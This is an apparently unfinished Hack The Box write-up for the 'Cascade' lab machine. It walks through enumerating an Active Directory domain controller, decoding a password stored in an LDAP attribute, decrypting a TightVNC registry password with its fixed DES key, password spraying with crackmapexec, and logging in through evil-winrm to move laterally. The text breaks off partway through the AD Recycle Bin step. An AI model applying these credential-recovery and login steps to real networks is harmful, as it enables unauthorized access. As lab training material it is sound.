# HTB - <Machine_Name>

## Overview

![](<machine>.infocard.png)

<Short description to include any strange things to be dealt with> 

## Useful Skills and Tools

#### <Useful thing 1>

<description with generic example>

#### <Useful thing 2>

<description with generic example>

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.182`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.

At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally. 
```
zweilos@kalimaa:~/htb/cascade$ nmap -p- -sC -sV -Pn -oN cascade.nmap 10.10.10.182
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 18:46 EDT
Nmap scan report for 10.10.10.182
Host is up (0.050s latency).
Not shown: 65520 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-24 22:52:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m12s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-24T22:53:48
|_  start_date: 2020-06-24T17:39:31

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 322.04 seconds
```

windows_server_2008:r2:sp1 old version of windows!

### smbclient
```
zweilos@kalimaa:~/htb/cascade$ smbclient -N \\\\10.10.10.182\\Data
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```
odd!
### rpcclient

```
rpcclient -U "" -N 10.10.10.182

rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

```
### Metasploit - Kerberos user enumeration

```
msf5 auxiliary(gather/kerberos_enumusers) > run
[*] Running module against 10.10.10.182

[*] Validating options...
[*] Using domain: CASCADE.LOCAL...
[*] 10.10.10.182:88 - Testing User: "cascguest"...
[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
[-] 10.10.10.182:88 - User: "cascguest" account disabled or locked out
[*] 10.10.10.182:88 - Testing User: "arksvc"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "arksvc" is present
[*] 10.10.10.182:88 - Testing User: "s.smith"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "s.smith" is present
[*] 10.10.10.182:88 - Testing User: "r.thompson"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "r.thompson" is present
[*] 10.10.10.182:88 - Testing User: "util"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "util" is present
[*] 10.10.10.182:88 - Testing User: "j.wakefield"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "j.wakefield" is present
[*] 10.10.10.182:88 - Testing User: "s.hickson"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "s.hickson" is present
[*] 10.10.10.182:88 - Testing User: "j.goodhand"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "j.goodhand" is present
[*] 10.10.10.182:88 - Testing User: "a.turnbull"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "a.turnbull" is present
[*] 10.10.10.182:88 - Testing User: "e.crowe"...
[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
[-] 10.10.10.182:88 - User: "e.crowe" account disabled or locked out
[*] 10.10.10.182:88 - Testing User: "b.hanson"...
[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
[-] 10.10.10.182:88 - User: "b.hanson" account disabled or locked out
[*] 10.10.10.182:88 - Testing User: "d.burman"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "d.burman" is present
[*] 10.10.10.182:88 - Testing User: "backupsvc"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "backupsvc" is present
[*] 10.10.10.182:88 - Testing User: "j.allen"...
[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.182:88 - User: "j.allen" is present
[*] 10.10.10.182:88 - Testing User: "i.croft"...
[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
[-] 10.10.10.182:88 - User: "i.croft" account disabled or locked out
[*] Auxiliary module execution completed
```
This is interesting.  Some of the accounts have had their credentials revoked and have been disabled or locked out. I hope this is not the result of someone brute-forcing a login attempt!
### enum4linux

```
[+] Getting builtin group memberships:
Group 'Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group 'Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group 'Users' (RID: 545) has member: CASCADE\Domain Users
Group 'Guests' (RID: 546) has member: CASCADE\CascGuest
Group 'Guests' (RID: 546) has member: CASCADE\Domain Guests
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[IT] rid:[0x459]
group:[Production] rid:[0x45a]
group:[HR] rid:[0x45b]
group:[AD Recycle Bin] rid:[0x45f]
group:[Backup] rid:[0x460]
group:[Temps] rid:[0x463]
group:[WinRMRemoteWMIUsers__] rid:[0x465]
group:[Remote Management Users] rid:[0x466]
group:[Factory] rid:[0x46c]
group:[Finance] rid:[0x46d]
group:[Audit Share] rid:[0x471]
group:[Data Share] rid:[0x472]

[+] Getting local group memberships:
Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users
Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers
Group 'IT' (RID: 1113) has member: CASCADE\arksvc
Group 'IT' (RID: 1113) has member: CASCADE\s.smith
Group 'IT' (RID: 1113) has member: CASCADE\r.thompson
Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith
Group 'HR' (RID: 1115) has member: CASCADE\s.hickson
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]
```
`IT` Group contains: Ryan Thompson, Steve Smith, ArkSvc.  
`HR` group contains: Stephanie Hickson
`AD Recycle Bin` Group contains: ArkSvc
`Remote Management Users` Group contains Steve Smith (s.smith), ArkSvc
```

### ldapsearch
```
# Remote Management Users, Groups, UK, cascade.local
dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: group
cn: Remote Management Users
member: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
member: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
distinguishedName: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=lo
 cal
instanceType: 4
whenCreated: 20200113032705.0Z
whenChanged: 20200117213541.0Z
uSNCreated: 94253
uSNChanged: 127173
name: Remote Management Users
objectGUID:: mcLF5nZ80kCiOcrXdXFmjA==
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZgQAAA==
sAMAccountName: Remote Management Users
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117213546.0Z
dSCorePropagationData: 20200117213257.0Z
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 16010714223232.0Z
```

SHARES:
\\Casc-DC1\Audit$
\\Casc-DC1\Data
Each of these shares also had an associated security group.

```
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200624203207.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 319688
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132375043274134331
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```
Easily overlooked, there was an entry on the user `r.thompson` that seemed to have a potential password. `cascadeLegacyPwd: clk0bjVldmE=`

Base64 decoding this give: `rY4n5eva`

### crackmapexec 
```
zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182

Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)
zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\r.thompson:rY4n5eva
```

## Initial Foothold
### Enumeration as User `r.thompson`

### smbmap
```
zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
[+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

### smbclient

`r.thompson` is a member of the `IT` group so that is probably what he has access to. However, it seems to be a dead end.

```
smb: \> ls IT\
  .                                   D        0  Tue Jan 28 13:04:51 2020
  ..                                  D        0  Tue Jan 28 13:04:51 2020
  Email Archives                      D        0  Tue Jan 28 13:00:30 2020
  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020
  Logs                                D        0  Tue Jan 28 19:53:04 2020
  Temp                                D        0  Tue Jan 28 17:06:59 2020

                13106687 blocks of size 4096. 7795046 blocks available
smb: \> tarmode
tar:311  tarmode is now full, system, hidden, noreset, quiet
smb: \> recurse
smb: \> prompt
smb: \> mget *
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (6.9 KiloBytes/sec) (average 9.0 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (28.3 KiloBytes/sec) (average 15.4 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (13.8 KiloBytes/sec) (average 15.0 KiloBytes/sec)
```
I used a little trick I leared on the machine `Nest` for downloading all of the files in an SMB folder recursively. Next I browsed through my loot.

image here
I found another potential username `TempAdmin` in the email file.

```
/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```
this looked interesting.  If I could login as this service I would probably have SeBackupPrivilege which would grant pretty much instant pwn. this service also has `Remote Manacement Users` group membership so it seems likely that this is a good path to look for.

```
zweilos@kalimaa:~/htb/cascade/IT/Temp/s.smith$ cat VNC\ Install.reg 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

As soon as I saw the VNC install .reg key I knew there would be a password in it, and I was not dissapointed.  
https://github.com/frizb/PasswordDecrypts

>VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines.

```
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
=> "sT333ve2"
```

```
zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\s.smith:sT333ve2
```


## Road to User

### Further enumeration

### Finding user creds


### User.txt

```
zweilos@kalimaa:~/htb/cascade$ evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

```
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
f29abe4e609b2aebb4fe99257a9eb507
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `s.smith`
## smbmap
```
zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
[+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```
smith has access to the IT Data and Audit shares, as well as print$ and SYSVOL
```
zweilos@kalimaa:~/htb/cascade$ smbclient -U s.smith -W Cascade \\\\10.10.10.182\\Audit$
Enter CASCADE\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                       A    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                      A    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                13106687 blocks of size 4096. 7794884 blocks available
```
the file `RunAudit.bat` only contained the line `*Evil-WinRM* PS C:\shares\audit> more  RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"`

```
*Evil-WinRM* PS C:\shares\audit> more  RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```
using the command `sqlite3 Auditdb` gets me a sqlite shell where I can enumerate the database
```
zweilos@kalimaa:~/htb/cascade$ sqlite3 Audit.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .databases
main: /home/zweilos/htb/cascade/Audit.db
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> .dump DeletedUserAudit 
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
);
INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
COMMIT;
sqlite> .dump Ldap
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
COMMIT;
sqlite>
```
Dumping the `Ldap` table of this database gives me the line `INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');` which looks like it contains a password for the ArkScv user I was hoping to move laterally into.  Now I had to figure out what kind of encryption it was stored with (not simple base64 unfortunately)

Opened `CascAudit.exe` and `CascCrypto.dll` in ILSpy; 
images
took the decryption method from crypto.dll and the key from the exe, put the code in dotnetfiddle.net

w3lc0meFr31nd
I'm not sure what the undecipherable characters are in the output, but luckily leaving them out did not casue any issues with logging in with this password.

## Moving Laterally to user `arksvc`
```
zweilos@kalimaa:~/htb/cascade$ evil-winrm -u arksvc -p w3lc0meFr31nd -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Darn, I expected this user to have SeBackupPrivilege.  Oh well, so much for the easy win. The group `AD Recycle Bin` looked promising however. 
https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/
>The Active Directory Recycle Bin was introduced in the Windows Server 2008 R2 release. 

It looks like I can use this to revive the `TempAdmin` account that we saw had been deleted in the database.  

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```
Running this command returns:
```
Deleted           : True
